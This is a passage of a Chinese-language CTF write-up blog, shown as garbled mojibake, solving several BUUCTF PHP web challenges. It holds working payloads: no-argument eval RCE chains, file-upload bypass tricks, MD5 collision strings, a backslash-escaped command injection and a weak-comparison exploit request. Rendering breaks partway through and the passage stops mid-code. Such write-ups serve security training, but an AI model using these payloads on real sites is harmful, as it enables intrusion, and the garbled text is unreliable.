<p>æ•…ä¸èƒ½ç›´æ¥è¾“å…¥å…¶ä»–çš„åœ°å€ï¼Œæ•…æˆ‘ä»¬å°è¯•æˆªæ–­è¯•è¯•è®©å…¶è·å–çš„å€¼ä¸ºæœ¬åœ°IPï¼š127.0.0.1ï¼š</p>
<p><img src= "/img/loading.gif" data-src="https://img.0x002.com/article/BuuCTF3/image-20200917133340932.png" alt="image-20200917133340932">å¯ä»¥çœ‹åˆ°é¢˜ç›®è¿”å›äº†PHPç‰ˆæœ¬ä¸º7.3.15ï¼Œ00æˆªæ–­é—®é¢˜å­˜åœ¨ï¼Œè€Œååˆç»™å‡ºäº†æç¤ºï¼ŒHOSTå¿…é¡»ä¸º123ï¼Œä¿®æ”¹æˆ–è®¿é—®å¾—åˆ°FLAGï¼š</p>
<p><img src= "/img/loading.gif" data-src="https://img.0x002.com/article/BuuCTF3/image-20200917133838216.png" alt="image-20200917133838216"></p>
<h2 id="GXYCTF2019-ç¦æ­¢å¥—å¨ƒ"><a href="#GXYCTF2019-ç¦æ­¢å¥—å¨ƒ" class="headerlink" title="[GXYCTF2019]ç¦æ­¢å¥—å¨ƒ"></a>[GXYCTF2019]ç¦æ­¢å¥—å¨ƒ</h2><p>æ‰“å¼€é¢˜ç›®ï¼Œé¦–é¡µæ˜¾ç¤ºï¼š</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flagåœ¨å“ªé‡Œå‘¢ï¼Ÿ</span><br></pre></td></tr></table></figure>
<p>æŸ¥çœ‹æºä»£ç ä»¥åŠå“åº”å¤´ï¼Œå‡æ— tipsç»™å‡º</p>
<p>ä½¿ç”¨direarchæ‰«ææ–‡ä»¶ï¼Œå¾—åˆ°å¦‚ä¸‹ç»“æœï¼š</p>
<p><img src= "/img/loading.gif" data-src="https://img.0x002.com/article/BuuCTF3/image-20200917142513897.png" alt="image-20200917142513897"></p>
<p>å‘ç°å­˜åœ¨.gitç›®å½•æ³„éœ²ï¼Œå°è¯•è¿˜æœ‰lijiejieçš„githackè„šæœ¬è¿˜åŸä»£ç ï¼š</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2 Githack.py http:&#x2F;&#x2F;www.example.com&#x2F;.git&#x2F;</span><br></pre></td></tr></table></figure>
<p>å¾—åˆ°æ–‡ä»¶index.phpï¼Œæºä»£ç å¦‚ä¸‹ï¼š</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">"flag.php"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"flagåœ¨å“ªé‡Œå‘¢ï¼Ÿ&lt;br&gt;"</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'exp'</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span> (!preg_match(<span class="string">'/data:\/\/|filter:\/\/|php:\/\/|phar:\/\//i'</span>, $_GET[<span class="string">'exp'</span>])) &#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="string">';'</span> === preg_replace(<span class="string">'/[a-z,_]+\((?R)?\)/'</span>, <span class="keyword">NULL</span>, $_GET[<span class="string">'exp'</span>])) &#123;</span><br><span class="line">            <span class="keyword">if</span> (!preg_match(<span class="string">'/et|na|info|dec|bin|hex|oct|pi|log/i'</span>, $_GET[<span class="string">'exp'</span>])) &#123;</span><br><span class="line">                <span class="comment">// echo $_GET['exp'];</span></span><br><span class="line">                @<span class="keyword">eval</span>($_GET[<span class="string">'exp'</span>]);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">"è¿˜å·®ä¸€ç‚¹å“¦ï¼"</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">"å†å¥½å¥½æƒ³æƒ³ï¼"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"è¿˜æƒ³è¯»flagï¼Œè‡­å¼Ÿå¼Ÿï¼"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// highlight_file(__FILE__);</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>å¾ˆæ˜æ˜¾ï¼Œé¢˜ç›®éœ€è¦æˆ‘ä»¬æ„é€ ä¸€ä¸ªæ— å‚å‘½ä»¤æ‰§è¡Œpayloadã€‚</p>
<p>å¸¸è§çš„æ— å‚æ„é€ åˆ©ç”¨æ–¹æ³•å¦‚ä¸‹ï¼š</p>
<blockquote>
<ul>
<li>getenv()+array_rand()+array_flip()ï¼Œå…¶ä¸­getenvè¿”å›åŒ…å«å½“å‰ç¯å¢ƒä¿¡æ¯çš„æ•°ç»„ï¼Œarray_randéšæœºè¿”å›æ•°ç»„çš„å€¼ï¼Œarray_flipå°†æ•°ç»„é”®å€¼äº’æ¢ã€‚</li>
<li>end(getallheaders())</li>
<li>apache+array_rand()+end()+ger_defined_vars()</li>
<li>hex2bin()+session_id()+session_start()ï¼ŒPHPSESSIONå…è®¸æ•°å­—ä¸å­—æ¯å‡ºç°ï¼ˆéƒ¨åˆ†ç¬¦å·ä¹Ÿå¯ï¼Œå¦‚æ‹¬å·ï¼Œç‚¹å·ï¼‰ã€‚</li>
<li>dirname()å–ç›®å½•å‚æ•°çš„ä¸Šä¸€çº§ç›®å½•ï¼Œgetcwd()å–å½“å‰ç›®å½•ï¼Œchdirè®¾ç½®å½“å‰å·¥ä½œç›®å½•ã€‚è·¨ç›®å½•è¯»å–demoï¼š<code>readfile(next(array_reverse(scandir(dirname(chdir(dirname(getcwd())))))));</code>ã€‚</li>
<li><code>readfile(next(array_reverse(scandir(current(localeconv())))));</code></li>
</ul>
<p>æ‘˜è‡ªï¼š<a href="[https://skysec.top/2019/03/29/PHP-Parametric-Function-RCE/">PHP Parametric Function RCE</a>)</p>
</blockquote>
<blockquote>
<ul>
<li><a href="https://www.w3school.com.cn/php/func_array_end.asp" target="_blank" rel="noopener">end()</a> â€“ å°†å†…éƒ¨æŒ‡é’ˆæŒ‡å‘æ•°ç»„ä¸­çš„æœ€åä¸€ä¸ªå…ƒç´ ï¼Œå¹¶è¾“å‡º</li>
<li><a href="https://www.w3school.com.cn/php/func_array_next.asp" target="_blank" rel="noopener">next()</a> â€“ å°†å†…éƒ¨æŒ‡é’ˆæŒ‡å‘æ•°ç»„ä¸­çš„ä¸‹ä¸€ä¸ªå…ƒç´ ï¼Œå¹¶è¾“å‡º</li>
<li><a href="https://www.w3school.com.cn/php/func_array_prev.asp" target="_blank" rel="noopener">prev()</a> â€“ å°†å†…éƒ¨æŒ‡é’ˆæŒ‡å‘æ•°ç»„ä¸­çš„ä¸Šä¸€ä¸ªå…ƒç´ ï¼Œå¹¶è¾“å‡º</li>
<li><a href="https://www.w3school.com.cn/php/func_array_reset.asp" target="_blank" rel="noopener">reset()</a> â€“ å°†å†…éƒ¨æŒ‡é’ˆæŒ‡å‘æ•°ç»„ä¸­çš„ç¬¬ä¸€ä¸ªå…ƒç´ ï¼Œå¹¶è¾“å‡º</li>
<li><a href="https://www.w3school.com.cn/php/func_array_each.asp" target="_blank" rel="noopener">each()</a> â€“ è¿”å›å½“å‰å…ƒç´ çš„é”®åå’Œé”®å€¼ï¼Œå¹¶å°†å†…éƒ¨æŒ‡é’ˆå‘å‰ç§»åŠ¨</li>
</ul>
<p>å¸¸è§æ•°ç»„æ“ä½œï¼Œæ‘˜è‡ªï¼šw3school</p>
</blockquote>
<p>é¢˜ç›®å…³é”®æ­£åˆ™åˆ†æï¼š<code>[a-z,_]+\((?R)?\)</code></p>
<p><code>(?R)</code>è¡¨ç¤ºå½“å‰æ­£åˆ™è¡¨è¾¾å¼ï¼Œä¹Ÿå°±æ˜¯<code>[a-z,_]+\((?R)?\)</code>æœ¬èº«ï¼Œæ•…è¿™ä¸ªè¡¨è¾¾å¼æœ¬è´¨ä¸Šç±»ä¼¼å¥—å¨ƒæ­£åˆ™ï¼Œå³ï¼š</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[a-z,_]+\([a-z,_]+\([a-z,_]+\([a-z,_]+\(...\)\)\)\)</span><br><span class="line">èƒ½åŒ¹é…ï¼š</span><br><span class="line">a(b(c(...))) # ä»»æ„ä¸ªå‡½æ•°çš„åµŒå¥—ï¼Œæ³¨æ„éƒ½æ˜¯ç”¨çš„å‡½æ•°è¿”å›å€¼åšå‚</span><br></pre></td></tr></table></figure>
<p>æ³•ä¸€ï¼š</p>
<p><img src= "/img/loading.gif" data-src="https://img.0x002.com/article/BuuCTF3/image-20200917144953794.png" alt="image-20200917144953794"></p>
<p>æ³•äºŒï¼š</p>
<p><img src= "/img/loading.gif" data-src="https://img.0x002.com/article/BuuCTF3/image-20200917145856228.png" alt="image-20200917145856228"></p>
<p>æ³•ä¸‰ï¼š</p>
<p><img src= "/img/loading.gif" data-src="https://img.0x002.com/article/BuuCTF3/image-20200917150050106.png" alt="image-20200917150050106"></p>
<h2 id="MRCTF2020-ä½ ä¼ ä½ ğŸå‘¢"><a href="#MRCTF2020-ä½ ä¼ ä½ ğŸå‘¢" class="headerlink" title="[MRCTF2020]ä½ ä¼ ä½ ğŸå‘¢"></a>[MRCTF2020]ä½ ä¼ ä½ ğŸå‘¢</h2><p>ç»å…¸ä¸Šä¼ é¢˜ï¼Œ.htaccessè§£æå›¾ç‰‡å³å¯ã€‚</p>
<p><img src= "/img/loading.gif" data-src="https://img.0x002.com/article/BuuCTF3/image-20200917151230825.png" alt="image-20200917151230825"></p>
<p>ä¸Šä¼ åŒ…å«phpä»£ç çš„æ–‡ä»¶ï¼š</p>
<p><img src= "/img/loading.gif" data-src="https://img.0x002.com/article/BuuCTF3/image-20200917151319238.png" alt="image-20200917151319238"></p>
<p>è®¿é—®å³å¯å¾—åˆ°FLAGï¼š</p>
<p><img src= "/img/loading.gif" data-src="https://img.0x002.com/article/BuuCTF3/image-20200917151337633.png" alt="image-20200917151337633"></p>
<p>ç®€å•æ€»ç»“ä¸‹ä¸Šä¼ é¢˜ç»å…¸å¥—è·¯ï¼š</p>
<ul>
<li>gif89aæ–‡ä»¶å¤´ã€<code>Content-Type: image/jpeg</code>æ–‡ä»¶ç±»å‹ã€ä¸Šä¼ <code>%00</code>æˆªæ–­æ–‡ä»¶å</li>
<li><code>phpã€php2ã€php3ã€php4ã€php5ã€phtmlã€phtm</code>åç¼€</li>
<li>.htaccessã€.user.iniç‰¹æ®Šä¸Šä¼ ï¼Œå‰è€…è¦æ±‚apacheç¯å¢ƒåè€…è¦æ±‚ï¼ŒåŒç›®å½•ä¸‹éœ€è¦å­˜åœ¨ä¸€ä¸ªphpæ–‡ä»¶</li>
<li><code>&lt;script language=â€phpâ€&gt;</code>ã€<code>&lt;? ?&gt;</code>ã€<code>&lt;?= ?&gt;</code>ã€‚</li>
</ul>
<h2 id="å®‰æ´µæ¯-2019-easy-web"><a href="#å®‰æ´µæ¯-2019-easy-web" class="headerlink" title="[å®‰æ´µæ¯ 2019]easy_web"></a>[å®‰æ´µæ¯ 2019]easy_web</h2><p>æ‰“å¼€é¢˜ç›®ï¼Œè§‚å¯Ÿåˆ°è¢«è·³è½¬åˆ°äº†å¦ä¸€ä¸ªURLï¼š</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">index.php?img&#x3D;TXpVek5UTTFNbVUzTURabE5qYz0&amp;cmd&#x3D;</span><br></pre></td></tr></table></figure>
<p>imgå‚æ•°æœ‰ç‚¹æƒ³base64ç¼–ç ï¼Œè¿ç»­base64è§£ç å¾—åˆ°ï¼š</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">3535352e706e6630</span><br></pre></td></tr></table></figure>
<p><img src= "/img/loading.gif" data-src="https://img.0x002.com/article/BuuCTF3/image-20200917154221860.png" alt="image-20200917154221860"></p>
<p>æ³¨æ„è§‚å¯Ÿï¼Œæœ‰æ•°å­—ï¼Œæœ‰å­—æ¯ï¼Œæ— ç¬¦å·ï¼Œæ•°å­—<code>0ã€3ã€5ã€2ã€7ã€6</code>ï¼Œå­—æ¯<code>e</code>ï¼Œæ»¡è¶³hexçš„èŒƒç•´ï¼Œå°è¯•hexè½¬å­—ç¬¦ä¸²å¾—ï¼š</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">555.pnf0</span><br></pre></td></tr></table></figure>
<p>æ•…æ­¤é¢˜çš„ç¼–ç åº”è¯¥ä¸ºstring-&gt;hex-&gt;base64-&gt;base64</p>
<p>å°è¯•è¯»å–index.phpï¼Œimgå‚æ•°ä¸º<code>base64_encode(base64_encode(hex2bin(&#39;index.php&#39;)))</code>ï¼š</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;index.php?img&#x3D;TmprMlpUWTBOalUzT0RKbE56QTJPRGN3&amp;cmd&#x3D;</span><br></pre></td></tr></table></figure>
<p>å¾—index.phpæºç ï¼š</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(E_ALL || ~ E_NOTICE);</span><br><span class="line">header(&#39;content-type:text&#x2F;html;charset&#x3D;utf-8&#39;);</span><br><span class="line">$cmd &#x3D; $_GET[&#39;cmd&#39;];</span><br><span class="line">if (!isset($_GET[&#39;img&#39;]) || !isset($_GET[&#39;cmd&#39;])) </span><br><span class="line">    header(&#39;Refresh:0;url&#x3D;.&#x2F;index.php?img&#x3D;TXpVek5UTTFNbVUzTURabE5qYz0&amp;cmd&#x3D;&#39;);</span><br><span class="line">$file &#x3D; hex2bin(base64_decode(base64_decode($_GET[&#39;img&#39;])));</span><br><span class="line"></span><br><span class="line">$file &#x3D; preg_replace(&quot;&#x2F;[^a-zA-Z0-9.]+&#x2F;&quot;, &quot;&quot;, $file);</span><br><span class="line">if (preg_match(&quot;&#x2F;flag&#x2F;i&quot;, $file)) &#123;</span><br><span class="line">    echo &#39;&lt;img src &#x3D;&quot;.&#x2F;ctf3.jpeg&quot;&gt;&#39;;</span><br><span class="line">    die(&quot;xixiÃ¯Â½Â no flag&quot;);</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    $txt &#x3D; base64_encode(file_get_contents($file));</span><br><span class="line">    echo &quot;&lt;img src&#x3D;&#39;data:image&#x2F;gif;base64,&quot; . $txt . &quot;&#39;&gt;&lt;&#x2F;img&gt;&quot;;</span><br><span class="line">    echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line">echo $cmd;</span><br><span class="line">echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">if (preg_match(&quot;&#x2F;ls|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|grep|sed|bzmore|bzless|pcre|paste|diff|file|echo|sh|\&#39;|\&quot;|\&#96;|;|,|\*|\?|\\|\\\\|\n|\t|\r|\xA0|\&#123;|\&#125;|\(|\)|\&amp;[^\d]|@|\||\\$|\[|\]|&#123;|&#125;|\(|\)|-|&lt;|&gt;&#x2F;i&quot;, $cmd)) &#123;</span><br><span class="line">    echo(&quot;forbid ~&quot;);</span><br><span class="line">    echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    if ((string)$_POST[&#39;a&#39;] !&#x3D;&#x3D; (string)$_POST[&#39;b&#39;] &amp;&amp; md5($_POST[&#39;a&#39;]) &#x3D;&#x3D;&#x3D; md5($_POST[&#39;b&#39;])) &#123;</span><br><span class="line">        echo &#96;$cmd&#96;;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        echo (&quot;md5 is funny ~&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;style&gt;</span><br><span class="line">  body&#123;</span><br><span class="line">   background:url(.&#x2F;bj.png)  no-repeat center center;</span><br><span class="line">   background-size:cover;</span><br><span class="line">   background-attachment:fixed;</span><br><span class="line">   background-color:#CCCCCC;</span><br><span class="line">&#125;</span><br><span class="line">&lt;&#x2F;style&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure>
<p>å…¶ä¸­å…³äºï¼š</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(string)$_POST[&#39;a&#39;] !&#x3D;&#x3D; (string)$_POST[&#39;b&#39;] &amp;&amp; md5($_POST[&#39;a&#39;]) &#x3D;&#x3D;&#x3D; md5($_POST[&#39;b&#39;])</span><br></pre></td></tr></table></figure>
<p>çš„ç»•è¿‡æ˜¯è€ç”Ÿå¸¸è°ˆäº†ï¼Œè¿™é‡Œå¯¹è¿™ç§md5å‡½æ•°æ€»ç»“ä¸€ä¸‹å‡ ç§æ–¹æ³•ï¼š</p>
<ul>
<li><p>æ•°ç»„å¯¹æ¯”ï¼Œa[]=1&amp;b[]=2ï¼Œmd5($a)=nullä¸”md5($b)=null</p>
</li>
<li><p>0eå¼±æ¯”è¾ƒç»•è¿‡ï¼Œs878926199aå’Œs1091221200a</p>
</li>
<li><p><code>`</code><br>%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%00%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%55%5d%83%60%fb%5f%07%fe%a2<br>%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%02%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%d5%5d%83%60%fb%5f%07%fe%a2<br>æ˜æ–‡ä¸åŒï¼ŒMD5ç›¸åŒã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">+ md5($str,true)ï¼š</span><br></pre></td></tr></table></figure>
<p>content: 129581926211651571912466741651878684928<br>hex: 06da5430449f8f6f23dfc1276f722738<br>raw: \x06\xdaT0D\x9f\x8fo#\xdf\xc1â€™orâ€™8<br>string: T0Do#â€™orâ€™8</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>content: ffifdyop<br>hex: 276f722736c95d99e921722cf9ed621c<br>raw: â€˜orâ€™6\xc9]\x99\xe9!r,\xf9\xedb\x1c<br>string: â€˜orâ€™6]!r,b</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">+ NaNå’ŒINF</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">è¿™é‡Œæˆ‘ä»¬ç”¨ç¬¬ä¸‰ç§åŠæ³•æ¥ç»•è¿‡å³å¯ï¼Œè€Œå¯¹äºå‘½ä»¤æ‰§è¡Œï¼Œæˆ‘ä»¬çŸ¥é“ï¼Œåœ¨phpä¸­ï¼Œåå¼•å·\&#96;å¯ä»¥å½“åšç³»ç»Ÿå‘½ä»¤æ‰§è¡Œï¼Œè€Œè¿™é‡Œåˆè¿›è¡Œäº†å¾ˆå¤šè¿‡æ»¤ï¼Œåœ¨ä¹‹å‰ç¯‡çš„åˆ·é¢˜è®°å½•ä¸­æˆ‘æœ‰æåˆ°å‘½ä»¤æ‰§è¡Œçš„å¸¸è§è®¨è®ºï¼Œè¿™é‡Œæˆ‘ä»¬ä½¿ç”¨åæ–œçº¿\ç»•è¿‡ã€‚</span><br><span class="line"></span><br><span class="line">åœ¨Linuxä¸­ï¼Œåæ–œçº¿ä¼šè¢«çœç•¥æ‰ï¼Œå³&#96;ca\t&#96;ä¸&#96;cat&#96;ç›¸åŒã€‚</span><br><span class="line"></span><br><span class="line">æ•…EXPï¼š</span><br><span class="line"></span><br><span class="line">![image-20200917162459727](https:&#x2F;&#x2F;img.0x002.com&#x2F;article&#x2F;BuuCTF3&#x2F;image-20200917162459727.png)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">## [MRCTF2020]Ez_bypass</span><br><span class="line"></span><br><span class="line">æ‰“å¼€é¢˜ç›®å¾—åˆ°å¦‚ä¸‹æºä»£ç ï¼š</span><br><span class="line"></span><br><span class="line">&#96;&#96;&#96;php</span><br><span class="line">&lt;?php</span><br><span class="line">include &#39;flag.php&#39;;</span><br><span class="line">$flag&#x3D;&#39;MRCTF&#123;xxxxxxxxxxxxxxxxxxxxxxxxx&#125;&#39;;</span><br><span class="line">if(isset($_GET[&#39;gg&#39;])&amp;&amp;isset($_GET[&#39;id&#39;])) &#123;</span><br><span class="line">    $id&#x3D;$_GET[&#39;id&#39;];</span><br><span class="line">    $gg&#x3D;$_GET[&#39;gg&#39;];</span><br><span class="line">    if (md5($id) &#x3D;&#x3D;&#x3D; md5($gg) &amp;&amp; $id !&#x3D;&#x3D; $gg) &#123;</span><br><span class="line">        echo &#39;You got the first step&#39;;</span><br><span class="line">        if(isset($_POST[&#39;passwd&#39;])) &#123;</span><br><span class="line">            $passwd&#x3D;$_POST[&#39;passwd&#39;];</span><br><span class="line">            if (!is_numeric($passwd))</span><br><span class="line">            &#123;</span><br><span class="line">                 if($passwd&#x3D;&#x3D;1234567)</span><br><span class="line">                 &#123;</span><br><span class="line">                     echo &#39;Good Job!&#39;;</span><br><span class="line">                     highlight_file(&#39;flag.php&#39;);</span><br><span class="line">                     die(&#39;By Retr_0&#39;);</span><br><span class="line">                 &#125;</span><br><span class="line">                 else</span><br><span class="line">                 &#123;</span><br><span class="line">                     echo &quot;can you think twice??&quot;;</span><br><span class="line">                 &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            else&#123;</span><br><span class="line">                echo &#39;You can not get it !&#39;;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        else&#123;</span><br><span class="line">            die(&#39;only one way to get the flag&#39;);</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line">    else &#123;</span><br><span class="line">        echo &quot;You are not a real hacker!&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">    die(&#39;Please input first&#39;);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
</ul>
<p>ç®€å•çš„md5ç»•è¿‡+å¼±æ¯”è¾ƒï¼ŒEXPï¼š</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F;?gg[]&#x3D;1&amp;id[]&#x3D;2 HTTP&#x2F;1.1</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span><br><span class="line">Content-Length: 15</span><br><span class="line"></span><br><span class="line">passwd&#x3D;1234567a</span><br></pre></td></tr></table></figure>
<h2 id="BJDCTF2020-Mark-loves-cat"><a href="#BJDCTF2020-Mark-loves-cat" class="headerlink" title="[BJDCTF2020]Mark loves cat"></a>[BJDCTF2020]Mark loves cat</h2><p>æ‰“å¼€é¢˜ç›®ï¼Œé¡µé¢å…ƒç´ è¿‡å¤šï¼Œæ„Ÿè§‰æ²¡æœ‰å•¥å¯ç”¨çš„ä¿¡æ¯ã€‚</p>
<p>ç®€å•çœ‹ä¸€ä¸‹HTMLæºä»£ç +è¯·æ±‚å“åº”å¤´åï¼Œå°±æ‰“å¼€direarchå¼€å§‹æ‰«æäº†ï¼š</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 direarch.py -u http:&#x2F;&#x2F;x.x.x.x&#x2F; -e php,zip -t 1 # BUUè¯·æ±‚æ•°é™åˆ¶</span><br></pre></td></tr></table></figure>
<p>æ‰«æå™¨æœ‰æ‰«åˆ°.gitç›®å½•ï¼Œéšåæ‰“å¼€lijiejieçš„githackå·¥å…·ï¼Œå°è¯•dumpä¸‹æºç ã€‚</p>
<p>ä¸»è¦æ–‡ä»¶index.php:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span> <span class="string">'flag.php'</span>;</span><br><span class="line"></span><br><span class="line">$yds = <span class="string">"dog"</span>;</span><br><span class="line">$is = <span class="string">"cat"</span>;</span><br><span class="line">$handsome = <span class="string">'yds'</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span>($_POST <span class="keyword">as</span> $x =&gt; $y)&#123;</span><br><span class="line">    $$x = $y;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span>($_GET <span class="keyword">as</span> $x =&gt; $y)&#123;</span><br><span class="line">    $$x = $$y;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span>($_GET <span class="keyword">as</span> $x =&gt; $y)&#123;</span><br><span class="line">    <span class="keyword">if</span>($_GET[<span class="string">'flag'</span>] === $x &amp;&amp; $x !== <span 